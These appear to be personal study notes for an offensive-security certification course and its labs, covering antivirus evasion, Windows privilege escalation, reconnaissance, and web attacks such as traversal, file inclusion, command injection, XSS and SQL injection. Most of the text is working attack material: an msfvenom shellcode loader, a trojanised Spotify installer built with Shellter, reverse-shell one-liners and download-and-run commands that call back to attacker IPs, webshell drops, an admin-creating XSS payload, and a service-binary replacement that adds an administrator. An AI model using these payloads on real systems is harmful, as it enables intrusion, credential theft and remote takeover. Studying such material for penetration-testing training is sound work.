| **Inline Hooking**          | Overwrite function prologue to redirect execution to attacker's code      | Direct function hijack                 | High           | `VirtualProtect`, `WriteProcessMemory`          |

  - Testing for AV evasion > Virus & threat protection > Manage Settings > disable automatic sample submission  
  - Evading AV with Threat injection
    - `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.152 LPORT=443 -f psh-reflection` 
    - nano bypass.ps1
      ```
      $code = '
      [DllImport("kernel32.dll")]
      public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

      [DllImport("kernel32.dll")]
      public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

      [DllImport("msvcrt.dll")]
      public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

      function mjF6V {
        Param ($vxG, $ccK)
        $ag = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')

        return $ag.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object   System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($ag.GetMethod('GetModuleHandle')).Invoke($null, @($vxG)))), $ccK))
       }

       [Place the payload here]
       ```
      - `PS C:\Users\offsec\Desktop> .\bypass.ps1`  
      - `Get-ExecutionPolicy -Scope CurrentUser`  
      - `Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser`
      - `nc -lvnp 443`
      - `.\bypass.ps1`
      - receiving a reverse shell on netcat listener: `C:\Users\offsec>whoami`  
  - Automating the process
    - `apt-cache search shellter`
    - `sudo apt install shellter`
    - install wine
      ```
      sudo apt install wine
      sudo dpkg --add-architecture i386 && apt-get update && apt-get install wine32
      sudo apt install wine
      sudo dpkg --add-architecture amd64
      sudo  apt install -y qemu-user-static binfmt-support
      sudo apt-get update && apt-get install wine32
      ```
    - `shellter`
      ```
      Choose Operation Mode - Auto/Manual (A/M/H): A
      PE Target: /home/kali/Downloads/SpotifyFullWin10-32bit.exe
      Enable Stealth Mode? (Y/N/H): Y
      Use a listed payload or custom? (L/C/H): L
      Select payload by index: 1
      SET LHOST: 192.168.45.152
      SET LPORT: 443
      ```
    - Before transferring the file, setting up a handler for the meterpreter payload  
      `msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.152;set LPORT 443;run;"`  
    - Transfer the file `ftp -A 192.168.245.53`  `ftp> bin` `put SpotifyFullWin10-32bit.exe`  
    - meterpreter session open
      ```
      meterpreter > shell
      C:\Users\offsec\Desktop>whoami
      ```

### 17. Windows Privilege Escalation
- Goal: bypass UAC to execute at high integrity (admin member does not mean run with high integrity)  
- [Mimikatz](https://github.com/gentilkiwi/mimikatz): pass-the-hash, pass-the-ticket or build Golden tickets
- Enumerating Windows
  - username, hostname: `whoami`
  - existing users & groups: `whoami /groups`
  - enumerate the existing groups of user: `Get-LocalGroup` (powershell)
  - other users and groups: `Get-LocalUser` (powershell)
  - review the group member: `Get-LocalGroupMember adminteam`
  - OS, version, architecture, network info, installed apps, running processes
- Security Identifier (SID)
  - Local Security Authority (LSA) - local users
  - Domain Controller (DC) - domain users
  - Format: S-1-5-21-3623811015-3361044348-30300820-1013
  - RID (last digit of SID): 500 (admin), 501 (guest), 1000+ (normal user), 512 (domain admins), 513 (domain users)
    - S-1-0-0 (nobody), S-1-1-0 (everybody), S-1-5-11 (authenticated users), S-1-5-18 (local system), S-1-5-domainidentifier-500 (administrator)
  - access token
    - primary token: specify permission sets  
    - impersonation token  
  - Mandatory Integrity Control
    - integrity levels: system (kernel), high (admin), medium (standard), low (restricted). Process explorer can see the integrity level.
  - User Account Control
    - standard user token (non-privileged operations)
    - administrator token (require UCA concent prompt)  
- Information gather
  - Username and hostname
  - Group memberships of the current user
  - Existing users and groups
  - Operating system, version and architecture
  - Network information
  - Installed applications
  - Running processes
- Situation awareness
  - Connect to the bind shell and obtain username and hostname  
    `nc 192.168.124.220 4444` `whoami` > clientwk220\dave  
  - Group memberships of the user 'dave' (544-admin, 545-standard, 547 limited privilege/power users, 555 RDP access)  
    `C:\Users\dave> whoami /groups` > CLIENTWK220\helpdesk, BUILTIN\Remote Desktop Users  
  - Display other local users on CLIENT220: Administrator (disabled), BackupAdmin, dave, daveadmin, steve  
    ```
    C:\Users\dave> powershell
    PS C:\Users\dave> Get-LocalUser
    ```
  - Display other local groups on CLIENTWK220 > adminteam, second floor, BackupUsers, helpdesk  
    `PS C:\Users\dave> Get-LocalGroup`  
  - Display members of the group adminteam  
    `PS C:\Users\dave> Get-LocalGroupMember adminteam` > CLIENTWK220\daveadmin  
    `PS C:\Users\dave> Get-LocalGroupMember Administrators` > CLIENTWK220\daveadmin, CLIENTWK220\backupadmin  
  - Information about the operating system and architecture > OS Name, version, system type, [windows version~build](https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)  
    `PS C:\Users\dave> systeminfo`  
  - Information about the network configuration  > physical add, DHCP enabled, IPv4, Default gateway, DNS servers  
    `PS C:\Users\dave> ipconfig /all`  
  - routing table on CLIENTWK220  
    `PS C:\Users\dave> route print`  
  - Active network connections on CLIENTWK220   > local add  0.0.0.0:80, 0.0.0.0:443, 0.0.0.0:3306, 0.0.0.0:3389, 192.168.50.220:3389, 192.168.50.220:4444 (port 80,443, MySQL 3306, RDP 3389)
    `netstat -ano`
  - Installed applications on CLIENTWK220 (list both 32 and 64 bit apps) + review "Downloads" directory to find more potential programs> FileZilla, KeePass, 7-Zip, XAMPP
    ```
    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
    Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 

    displayname  
    ```
    
    ```
    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
    Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
    
    DisplayName   
    ```
  - Running processes on CLIENTWK220 >  bind shell with ID 2064 ,  PowerShell session with ID 9756, mysql, httpd
    `PS C:\Users\dave> Get-Process`
  - summary
    ```
    64-bit Windows 11 Pro Build 22621
    web server on ports 80 and 443
    MySQL server on port 3306
    bind shell on port 4444
    RDP connection on port 3389 from 192.168.48.3
    KeePass Password Manager, 7Zip, and XAMPP are installed
    ```
- Hidden in Plain View
  - Searching for password manager databases on the C:\ drive  
    `Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`  
  - Searching for sensitive information in XAMPP directory > passwords.txt, my.ini  
    `Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue`  
  - review the files  
    `type C:\xampp\passwords.txt` `type C:\xampp\mysql\bin\my.ini`  
  - Searching for text files and password manager databases in the home directory of dave > asdf.txt > password: securityIsNotAnOption++++++  
    `Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`  
  - check local group user 'dave' > Remote Desktop Users, helpdesk, Remote Management Use  
    `net user steve`  
  - connect to CLIENTWK220 with RDP as steve `xfreerdp3 /u:steve /p:securityIsNotAnOption++++++ /v:192.168.157.202 /cert:ignore /drive:share,/home/kali/share`  
  - `type C:\xampp\mysql\bin\my.ini` > contents of the my.ini file > MySQL password: admin123admin123!  
  - check local group user 'backupadmin' > not a member of 'remote desktop users' or 'remote management users'  
    `net user backupadmin`  
  - Using Runas to execute cmd as user backupadmin  
    `runas /user:backupadmin cmd`  
- Information goldmine PowerShell
  ```
  Get-History
  Clear-History 
  ```
  - Display path of the history file from PSReadline
    `(Get-PSReadlineOption).HistorySavePath`
    `type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
    ```
    Register-SecretVault -Name pwmanager -ModuleName SecretManagement.keepass -VaultParameters $VaultParams
    Set-Secret -Name "Server02 Admin PW" -Secret "paperEarMonitor33@" -Vault pwmanager
    Start-Transcript -Path "C:\Users\Public\Transcripts\transcript01.txt"
    Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
    ```
  - PowerShell Remoting by default uses WinRM for Cmdlets such as Enter-PSSession. Therefore, a user needs to be in the local group Windows Management Users
  - type C:\Users\Public\Transcripts\transcript01.txt
    ```
    Transcript started, output file is C:\Users\Public\Transcripts\transcript01.txt
    PS C:\Users\dave> $password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
    PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
    PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
    PS C:\Users\dave> Stop-Transcript
    ```
  - Using the commands from the transcript file to obtain a PowerShell session as daveadmin. Start a PowerShell remoting session via WinRM on CLIENTWK220 as the user daveadmi (No output dir)
  - Use evil-winrm to connect to CLIENTWK220 as daveadmin instead  
    `evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"`
- Automated Enumeration
  - Copy WinPEAS to our home directory and start Python3 web server
    `cp /usr/share/peass/winpeas/winPEASx64.exe .`  `python3 -m http.server 80`
  - Connect to the bind shell and transfer the WinPEAS binary to CLIENTWK220
    `nc 192.168.50.220 4444`  `powershell`
    `iwr -uri http://<KALI>/winPEASx64.exe -Outfile winPEAS.exe`  
  -  Run winPEAS `.\winPEAS.exe`  
  -  Review output: system info (Windows), NTLM settings, transcripts history, Users, possible password
- Service Binary Hijacking (RDP)
  - List of services with binary path > Apache, mysql  
    `Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}`
  - Permissions of httpd.exe > Full, Modify, RX, R, W  
    `icacls "C:\xampp\apache\bin\httpd.exe"` //BULLTIN\Users:(RX)  
    `icacls "C:\xampp\mysql\bin\mysqld.exe"` //BULLTIN\Users:(F)  
  - create a binary file adduser.c to replace the original mysqld.exe
    ```
    #include <stdlib.h>

    int main ()
    {
      int i;
  
      i = system ("net user dave2 password123! /add");
      i = system ("net localgroup administrators dave2 /add");
  
     return 0;
    }
    ```
  - cross-compile the code to 64-bit app
    `x86_64-w64-mingw32-gcc adduser.c -o adduser.exe`
  - transfer the exe to target and replace mysqld.exe
    ```
    iwr -uri http://192.168.48.3/adduser.exe -Outfile adduser.exe
    move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
    move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
    ```
  - restart the service to execute the binary > access denied  
    `net stop mysql`
  - another approach, check the startup type > Auto  
    `Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}`
  - check the privilege "SeShutDownPrivilege" for reboot privilege  
    `whoami /priv`
  - reboot machine  
    `shutdown /r /t 0`
  - connect again as dave via RDP and open a PowerShell window. new user 'dave2' created.  
    `Get-LocalGroupMember administrators`  
  - Copy PowerUp.ps1 to kali's home directory and serve it with a Python3 web server  
    `cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .`  
    `python3 -m http.server 80`  
  - On target machine, download the PowerUp.ps1 and displays services the current user can modify > identified mysql (among others) to be vulnerable  
    ```
    iwr -uri http://<KALI>/PowerUp.ps1 -Outfile PowerUp.ps1 //PowerShell post-exploitation tool used primarily for Windows privilege escalation
    powershell -ep bypass
    . .\PowerUp.ps1
    Get-ModifiableServiceFile
    ```
  - Error of "AbuseFunction" to replace binary file  
    `Install-ServiceBinary -Name 'mysql'` //mysql' for service mysql not modifiable by the current user
  - Listing 55 - Analyzing the function ModifiablePath      
- DLL hijacking
- Unquoted Service Paths
- Scheduled Tasks
- Using Exploits   
### 18. Linux privilege escalation
### 19. Port redirection and SSH tunneling
### 20. Tunneling through deep packet inspectation
### 21. The metassploit framework
### 22. Active directory introduction and enumeration
### 23. Attacking active drectiory authentication
### 24. Lateral movement in active directory
### 25. Enumerating AWS Cloud Infrastruture
### 26. Attacking AWS cloud infrastruture 
### 27. Assembling the pieces

## PWK-200 labs
### Information gathering
- 6.2.1 Whois Enumeration  
  `whois megacorpone.com -h 192.168.50.251`
- 6.2.2 Google Hacking  
  `site:megacorpone.com intext:"VP of Legal"`  
  `site:linkedin.com/in "MegaCorp One"`    
  Google: rocketreach.co "MegaCorp One"
- 6.2.3 Netcraft  
  `https://sitereport.netcraft.com/?url=http://www.megacorpone.com` (View the report under section Network & site technology)
- 6.2.4 Open-Source Code  
  `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v` (No leaks)  
  `nano config/gitleaks.toml`  
  ```
  [[rules]]
  id = "apache-htpasswd-md5"
  description = "Detect Apache htpasswd MD5 hash (APR1)"
  regex = '''(?i)\b[a-z0-9._%-]+:\$apr1\$[A-Za-z0-9./$]{8,}'''
  keywords = ["$apr1$"]
  tags = ["password", "apache", "htpasswd"]
  ```
  `./gitleaks dir /home/kali/offsec/megacorpone.com/megacorpone -v -c=config/gitleaks.toml` (Leaks found on home/kali/offsec/megacorpone.com/megacorpone/xampp.users)  
- 6.4.1 DNS enumeration
  - Perform a DNS enumeration on the MX records of megacorpone.com (lower priroty valid higher preference)  
    `host -t mx megacorpone.com`  
  - How many TXT records are associated with the megacorpone.com domain  
    `host -t txt megacorpone.com`  
  -  IP of the siem.megacorpone.com  
     `dnsenum siem.megacorpone.com`  
  -  RDP to win11 + enumerate megacorptwo.com and its subdomains through nslookup. TXT record of the info.megacorptwo.com domain
     ```
     xfreerdp3 /u:student /p:lab /v:192.168.165.152
     nslookup megacorptwo.com 
     nslookup -type=TXT info.megacorptwo.com 192.168.165.151
     ```
- 6.4.2 TCP/UDP Port scanning
  - Netcat scan for port 1-1000 (show open port only)  
    `nc -nvv -w 1 -z 192.168.165.151 1-1000 2>&1 | grep open`
  - Netcat TCP port scan 1-10000 (show open port only)
    `nc -nvv -w 1 -z 192.168.165.151 1-10000 2>&1 | grep open`
  - Netcat UDP port scan
    `nc -nv -u -z -w 1 192.168.165.151 150-200 2>&1 | grep open`
- 6.4.3 Port scanning with Nmap
  - SYN scan for /24 subnet + port 25 open  
    `sudo nmap -sS -p 25 192.168.165.0/24 --open`  
  - SYN scan for /24 subnet + port WHOIS open  
    `sudo nmap -sT -p 43 192.168.165.0/24 --open`  
  - RDP to win11 + TCP port discovery against windows DC, first 4 open TCP ports  
    `xfreerdp3 /u:student /p:lab /v:192.168.165.152`  
    `PS: 1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.165.151", $_)) "TCP port $_ is open"} 2>$null`  
  - TCP port scan 50000-60000 to identify the highest TCP port  
    `sudo nmap -sT -p 50000-60000 192.168.165.52 --open`  
    `nc 192.168.165.52 59811`  
  - NSE website title and read the flag in index.html  
    `sudo nmap -p 80,8080 --script=http-title 192.168.165.0/24`  
    `curl http://192.168.165.6/index.html`  
- 6.4.4 SMB enumeration
  - nmap SMB (port 139, 445)
    `nmap -v -p 445 --open -oG smb.txt 192.168.165.0/24`
  - RDP Win11 + shares enumeration against dc01 via net view
    `net view \\dc01 /all`  
  - enum4linux for local users alfred
    ```
    sudo nmap -p 139,445 --open -oG smb_hosts.txt 192.168.165.0/24
    grep "/open/" smb_hosts.txt | awk '{print $2}' > smb_targets.txt
    enum4linux -a 192.168.165.13
    ```
- 6.4.5 SMTP enumeration
  - search open SMTP, netcat on port 25, VRFY user 'root' and get the response code
    ```
    nmap -sT -p 25 --open 192.168.165.0/24  
    nc 192.168.165.8 25
    VRFY root
    ```
- 6.4.6 SNMP enumeration
  - use onesixtyone to identify SNMP servers. List the all the running process.
    ```
    echo public > community
    echo private >> community
    echo manager >> community
    for ip in $(seq 1 254); do echo 192.168.165.$ip; done > ips
    onesixtyone -c community -i ips
    snmpwalk -c public -v1 192.168.165.151 1.3.6.1.2.1.25.4.2.1.2
    ```
  - enumerate interface descriptions with ASCII decoding (hex to ASCII)  
    `snmpwalk -c public -v1 -t 10 -Oa 192.168.165.151`

### Vulnerability Scanning  
- 7.3.1 NSE vulnerability script  
  `sudo nmap -sV -p 443 --script "vuln" 192.168.173.13`
- 7.3.2 working with NSE script  
  **Capstone Labs:** Follow the steps above to perform the vulnerability scan with the custom NSE script on VM #1.  
  
  [Apache HTTP Server 2.4.49 - Path Traversal (CVE-2021-41773)](https://www.exploit-db.com/exploits/50383)  
  `sudo cp /home/kali/Downloads/http-vuln-cve-2021-41773.nse /usr/share/nmap/scripts/http-vuln-cve2021-41773.nse`  
  `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" 192.168.173.13`  
  `curl -s --path-as-is http://192.168.173.13:443/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`  

### Introduction to Web Application Attacks  
- 8.2 web application assessment 
  - directory brute force with GoBuster
    `gobuster dir -u 192.168.173.16 -w /usr/share/wordlists/dirb/common.txt -t5 -b 301`: exclude bad status code 301 redirection to continue
    `gobuster dir -u 192.168.173.52 -w /usr/share/wordlists/dirb/common.txt -t5`  
  - Security Testing with Burp Suite
    `curl http://192.168.173.52/passwords.txt`: download password  
     burp intruder on POST /login.php + position (password=admin)
- 8.3 Web application enumeration
  - debug page content
    `sudo nano etc/hosts`
    192.168.173.16  offsecwp
    Browse about us page http://offsecwp/?p=1 > burp suite check response content > search the flag OS{
  - enumerate APIs
    ```
    nano pattern
    {GOBUSTER}/v1
    {GOBUSTER}/v2

    gobuster dir -u http://192.168.173.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
    curl -i http://192.168.173.16:5002/users/v1
    curl -i http://192.168.173.16:5002/books/v1
    ```
  - site-maps browsing (robots.txt, sitemap.xml)
    `nikto -h http://192.168.173.52`  
  - read http header via curl and decode base64 via [CyberChef](https://gchq.github.io/CyberChef/)
    `curl -i http://192.168.173.52`
  - find flag in html, css, js
    burp suite http history + filter by search item 'flag' + browser console run function
- 8.4 cross-site scripting
  - XSS attack in user-agent - create new user and privilege via xss
    - login http://offsecwp/wp-login.php (admin, password)
    - JSCompress
      ```
      var ajaxRequest = new XMLHttpRequest();
      var requestURL = "/wp-admin/user-new.php";
      var nonceRegex = /ser" value="([^"]*?)"/g;
      ajaxRequest.open("GET", requestURL, false);
      ajaxRequest.send();
      var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
      var nonce = nonceMatch[1];
      var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
      ajaxRequest = new XMLHttpRequest();
      ajaxRequest.open("POST", requestURL, true);
      ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      ajaxRequest.send(params);
      ```
    - Run this function and get the encoded js
      ```
      function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
      let encoded = encode_to_javascript('var ajaxRequest=new XMLHttpRequest,requestURL="/wp-admin/user-new.php",nonceRegex=/ser" value="([^"]*?)"/g;ajaxRequest.open("GET",requestURL,!1),ajaxRequest.send();var nonceMatch=nonceRegex.exec(ajaxRequest.responseText),nonce=nonceMatch[1],params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";(ajaxRequest=new XMLHttpRequest).open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
      console.log(encoded)
      ```
    - intercept the burp request and modify the user-agent
      ```
      <script>eval(String.fromCharCode(118,97,114,32,97,106,97,....))</script>
      ```
  - **Capstone Lab**: craft a wordpress plugin that embeds a web shell and enumerate the target system (locate the flag)  
    - https://github.com/jckhmr/simpletools/blob/master/wonderfulwebshell/wonderfulwebshell.php
    - `nano webshell.php`
    - `zip webshell.zip webshell.php`
    - Upload plugin.zip and activate
    - `http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=find%20/%20-name%20flag%202%3E/dev/null`: find flag  
    - `http://offsecwp/wp-content/plugins/mylovelywebshell/webshell.php/?cmd=cat%20/tmp/flag`

### Common Web Application Attacks  
- 9.1.2 Identifying and Exploiting Directory Traversals
  - obtain SSH private key for the user offsec then SSH
    - `curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa`
    - nano dt_key (-----BEGIN OPENSSH PRIVATE KEY----- -----END OPENSSH PRIVATE KEY-----)
    - ssh -i dt_key -p 2222 offsec@mountaindesserts.com  
  - golangexample cve-2021-43798 port 3000
    - `curl --path-as-is http://192.168.163.193:3000/public/plugins/alertlist/../../../../../../../../users/install.txt`
- 9.1.3 Encoding special chrs
  - url encoding (Don't normalize the url)
    - `curl --path-as-is http://192.168.163.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords`
  - Grafana URL partial encoding bypass
    - `curl --path-as-is http://192.168.163.16:3000/public/plugins/alertlist/%2E./%2E./%2E./%2E./../../../../opt/install.txt`
- 9.2.1 Local file inclusion (LFI)
  - write system cmd to **access.log** file  
    embed system cmd  
    `User-Agent: Mozilla/5.0 <?php echo system($_GET['cmd']); ?>`  
    run url encoding web shell command  
    `GET /meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.165%2F4444%200%3E%261%22`
  - LFI **/opt/admin.bak.php**  
    `curl http://mountaindesserts.com:8001/meteor/index.php?page=../../../../../../../../../opt/admin.bak.php`
  - windows LFI + **Log poisoning** C:\xampp\apache\logs\  
    Modify user agent:  `<?php echo system($_GET['cmd']); ?>`  
    `GET /meteor/index.php?page=C:/xampp/apache/logs/access.log&cmd=type%20hopefullynobodyfindsthisfilebecauseitssupersecret.txt`
- 9.2.2 PHP Wrappers
  - LFI **php://filter** to include content of /var/www/html/backup.php  
    `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=/var/www/html/backup.php`  
  - LFI **data://** PHP to execute uname -a  
    base64: echo -n `<?php echo system($_GET["cmd"]);?>`   
    `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=uname -a"`
- 9.2.3 Remote File inclusion (RFI)
  - RFI to include /usr/share/webshells/php/simple-backdoor.php + cmd to **cat /home/elaine/.ssh/authorized_keys**
    cd /usr/share/webshells/php/  `python3 -m http.server 80`
    `curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.221/simple-backdoor.php&cmd=cat%20/home/elaine/.ssh/authorized_keys"`
  - RFI to include **PHP reverse shell** from Pentestmonkey's GitHub + change the IP to kali + port 4444 + exploit port 8001
    1. download reverse_shell from https://github.com/pentestmonkey/php-reverse-shell
    2. change kali ip and port 4444 in .php
    3. python3 -m http.server 80
    4. nc -nvlp 4444
    5. `curl "http://mountaindesserts.com:8001/meteor/index.php?page=http://192.168.45.221/php-reverse-shell.php"`  
- 9.3.1 Using executable files
  - File upload + **bypass file extension filter** (.pHp) + read windows file C:\xampp\passwords.txt
    `curl http://192.168.224.189/meteor/uploads/simple-backdoor.pHP?cmd=type%20C:\\xampp\\passwords.txt`
  - **Web shell code executio**n
    start Apache of webshell + nc listener + upload php-reverse-shell.php. Uploaded files in /var/www/html/  
    `curl http://192.168.224.16/php-reverse-shell.php`  
    `cat /opt/install.txt`  
- 9.3.2 Using non executable files
   - **overwrite the authorized_keys** file with the file upload mechanism + ssh port 2222  
     at kali@kali home: `ssh-keygen`  `cat fileup.pub > authorized_keys`  

     intercept burp upload request  
     POST /upload HTTP/1.1  
     filename=`../../../../../../../root/.ssh/authorized_keys`  

     at kali@kali home: `rm ~/.ssh/known_hosts`  
     `ssh -p 2222 -i fileup root@mountaindesserts.com`  
- 9.4.1 OS Command injection
  - **PowerShell** reverse shell + windows
    ```
    1. Git command testing 
    curl -X POST --data 'Archive=git version' http://192.168.50.189:8000/archive
    curl -X POST --data 'Archive=git%3Bipconfig' http://192.168.50.189:8000/archive

    determining where the injected commands are execute
    curl -X POST --data 'Archive=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.50.189:8000/archive

    2. Server Powercat via web server
    cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 .
    python3 -m http.server 80

    3. netcat listen
    nc -nvlp 4444

    4. Exploit/curl
    curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.170%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.170%20-p%204444%20-e%20powershell' http://192.168.203.189:8000/archive

    5. Go to desktop and find the flag
    cd C:\Users\Administrator\Desktop
    type secrets.txt
    ```    
  - Netcat reverse shell + elevated priviledge (sudo su) + linux
    `nc 192.168.45.170 4444 -e /bin/bash`
    `curl -X POST --data 'Archive=nc%20192.168.45.170%204444%20-e%20%2Fbin%2Fbash' http://192.168.203.16/archive`
    whoami  
    sudo su  
    cat /opt/config.txt  
  - **Capstone lab**: identify os command vulnerabilities + bash shell reverse shell
    Test each input field one at a time (Burp intruter)
    ```
    ; id
    && id
    $(id)
    `id`
    ```
    Before encode: "&&bash -c 'bash -i >& /dev/tcp/192.168.45.170/4444 0>&1'"  
    Note: closes a previous string with ", then uses && to run a bash reverse shell connecting back to 192.168.45.170 on port 4444  
    `curl -X POST http://192.168.203.16/login -d "username=user" -d "password=pass" -d "ffa=%22%26%26bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.170/4444+0>%261'%22"`  
- **Capstone lab**: aspx webshell
  upload file from /usr/share/webshells/aspx/cmdasp.aspx  
  browse port 80 for uploaded shell: http://192.168.132.192/cmdasp.aspx  
  type C:\inetpub\flag.txt  

### SQL injection attacks
- 10.1.2 DB types and characteristic
  - MYSQL retrieve record
    ```
    mysql -u root -p'root' -h 192.168.132.16 -P 3306 --skip-ssl
    SELECT version();
    SELECT system_user();
    SHOW databases;  --db
    USE mysql;  --use db
    SHOW TABLES;  --table
    DESCRIBE user;  --columns
    SELECT user, plugin FROM mysql.user WHERE user = 'offsec';

    exit
    ```
  - MSSQL system table
    ```
    impacket-mssqlclient Administrator:Lab123@192.168.132.18 -windows-auth
    SELECT @@version;
    SELECT name FROM sys.databases;  --db
    USE master;  --use db
    SELECT * FROM information_schema.tables; --table
    SELECT COLUMN_NAME, DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'user'; --columns
    SELECT name FROM sysobjects WHERE xtype = 'S'; --systemtables sysusers
    SELECT uid, name from sysusers order by uid;  --first record
    ```
  - MYSQL to explore table
    ```
    mysql -u root -p'root' -h 192.168.132.16 -P 3306 --skip-ssl
    USE test;
    SHOW TABLES;
    SELECT * FROM users
    ```
- 10.33.1 Manual Code execution
  - error based  
    username: offsec'  
    `offsec' OR 1=1 --//`  
    `' or 1=1 in (select @@version) -- //`  
    `' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //`  
  - union-based
    ```
    ' ORDER BY 1 -- //
    %' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //
    %' UNION SELECT database(), user(), @@version, null, null -- //
    ' UNION SELECT null, null, database(), user(), @@version  -- //
    ' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
    ' UNION SELECT null, username, password, description, null FROM users -- //
    ```
  - time-based  
    `' AND IF (1=1, sleep(3),'false') -- //`  
  - boolean-based  
    `' AND 1=1 -- //`  
- 10.3.2. Automating the Attack  
  - ERROR-based mysql login bypass  
    `' OR 1=1 # `  
    `' or 1=1 in (select @@version) #`  
    `' OR 1=1 in (SELECT password FROM users) #`  
    https://10015.io/tools/md5-encrypt-decrypt    
  - UNION-based  mysql  
    identify number of columns: 5  
    `' ORDER BY 1 #`   > until error hit : E.g 6 hit, then columns are 5  
    current database name, version, user: offsec  
    `' UNION SELECT 'a', database(), @@version, user(), 'e' # `  
    List all databases: mysql  
    `' UNION SELECT null, schema_name, null, null, null FROM information_schema.schemata #`  
    List current db tables and columns: customers, users  
    `' UNION SELECT null, table_name, column_name, table_schema, null FROM information_schema.columns WHERE table_schema=database() #`  
    Dump data from a specific table  
    `' UNION SELECT null, username, password, null, null FROM users #`  
    Upload webshell  
    `' UNION SELECT null, "<?php system($_GET['cmd']);?>", null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" #`  
    Execute webshell  
    `http://192.168.173.19/tmp/webshell.php?cmd=find%20/%20-name%20%22flag.txt%22%202%3E/dev/null`  
    `http://192.168.173.19/tmp/webshell.php?cmd=cat%20flag.txt`  
  - sqlmap time based  
    Find SQL injection points: time-based blind  
    `sqlmap -u http://192.168.173.19/blindsqli.php?user=admin -p user`  
    Dump data from table (slow) - one click  
    `sqlmap -u http://192.168.173.19/blindsqli.php?user=admin -p user --dump`  
    List database  
    `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user --dbs --batch --threads=5`  
    List tables  
    `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec --tables --batch --threads=5`  
    Dump data for the table  
    `sqlmap -u "http://192.168.173.19/blindsqli.php?user=admin" -p user -D offsec -T users --dump --batch --threads=5`  
